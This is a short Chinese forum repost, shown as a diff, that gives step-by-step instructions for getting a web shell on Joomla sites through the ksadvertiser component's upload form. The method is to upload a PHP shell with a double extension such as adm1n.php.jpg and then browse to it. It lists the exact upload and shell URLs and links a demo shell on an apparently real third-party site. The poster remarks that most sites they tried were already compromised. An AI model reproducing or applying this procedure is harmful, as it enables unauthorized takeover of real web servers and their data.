@@ -1,0 +1,25 @@
+   [转载] Joomla 组件漏洞.直接getshell. [复制链接]  
+  
+
+
+辑 
+
+
+1.  有些joomal需要先注册.
+
+   http://site/index.php?option=com_user&view=login
+
+2.  到上传地址
+
+   http://site/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en
+
+3.  点击image后点击upload,选择shell, 将shell重名为adm1n.php.jpg格式.
+
+4.  上传后的文件在 / images/ksadvertiser/U0 这个目录下.
+
+    http://site/images/ksadvertiser/U0/adm1n.php.gif
+
+  Demo: http://alt.kiss-software.de/images/ksadvertiser/U0/403.php.gif
+
+我随便测试了一下, 基本都被搞了. 疯狂的人们啊, 这今天刚出的漏洞就成这样了... 1337V5啊 
+ 
